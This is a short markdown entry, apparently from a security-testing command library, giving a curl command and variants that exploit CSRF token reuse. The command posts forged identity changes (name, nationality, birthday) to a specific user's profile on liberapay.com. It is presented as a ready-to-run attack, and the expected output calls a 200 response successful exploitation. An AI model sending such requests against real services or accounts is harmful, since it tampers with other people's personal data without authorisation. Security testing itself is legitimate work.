---
data: >-
  curl -X POST 'https://liberapay.com/~153780/identity' -H 'Cookie:
  session=your_session_cookie' -d 'csrf_token=F798zSeZ80HjZipmUAh9ga4DFTgJgZ1H'
  -d 'FirstName=Modified' -d 'LastName=User' -d 'CountryOfResidence=US' -d
  'Nationality=US' -d 'Birthday=1990-01-01'
tags:
  - http
  - post
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.151Z'
id: 7a25beaf-6f80-4006-819f-5795ab1c7e7f
verified: false
validated: true
submitted: true
---
# curl-reused-csrf-post

## Command

```bash
curl -X POST 'https://liberapay.com/~153780/identity' \
  -H 'Cookie: session=your_session_cookie' \
  -d 'csrf_token=F798zSeZ80HjZipmUAh9ga4DFTgJgZ1H' \
  -d 'FirstName=Modified' \
  -d 'LastName=User' \
  -d 'CountryOfResidence=US' \
  -d 'Nationality=US' \
  -d 'Birthday=1990-01-01'
```

## Description

This command tests CSRF token reuse by sending a POST request to Liberapay's identity endpoint with a token from another session, demonstrating bypass of validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H 'Cookie: ...'` | Sets the session cookie header for authentication | Yes |
| `-d 'csrf_token=...'` | Provides the reused CSRF token value | Yes |
| `-d 'FirstName=...'` | Form data for first name | Yes |
| `-d 'LastName=...'` | Form data for last name | Yes |
| `-d 'CountryOfResidence=...'` | Form data for country | Yes |
| `-d 'Nationality=...'` | Form data for nationality | Yes |
| `-d 'Birthday=...'` | Form data for birthday | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://liberapay.com/~153780/identity' -H 'Cookie: session=abc123' -d 'csrf_token=reused_token' -d 'FirstName=Jane'
```

### Advanced Usage

Include silent mode with `-s` and follow redirects with `-L`:

```bash
curl -s -L -X POST 'https://liberapay.com/~153780/identity' -H 'Cookie: session=abc123' -d 'csrf_token=reused_token' -d 'FirstName=Jane'
```

## Expected Output

HTTP/1.1 200 OK response confirming the update, without token rejection, indicating successful exploitation.

## Related

- [[commands/curl-original-csrf-post]]
- [[procedures/Exploit-Reusable-CSRF-Tokens-for-Identity-Update]]
